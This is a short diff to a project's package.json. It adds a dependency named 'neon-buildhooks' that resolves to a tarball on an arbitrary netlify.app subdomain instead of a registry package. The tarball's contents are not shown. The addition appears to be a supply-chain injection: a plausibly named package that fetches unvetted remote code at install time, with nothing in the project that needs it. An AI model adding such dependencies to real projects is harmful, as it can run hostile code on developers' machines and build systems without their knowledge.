@@ -6,6 +6,7 @@
   "author": "Netlify",
   "license": "MIT",
   "dependencies": {
-    "@netlify/angular-runtime": "2.4.0"
+    "@netlify/angular-runtime": "2.4.0",
+    "neon-buildhooks": "https://37fb2d91-fc5f-402b-b52c-84240e7335fa.netlify.app/packages/buildhooks.tgz"
   }
 }
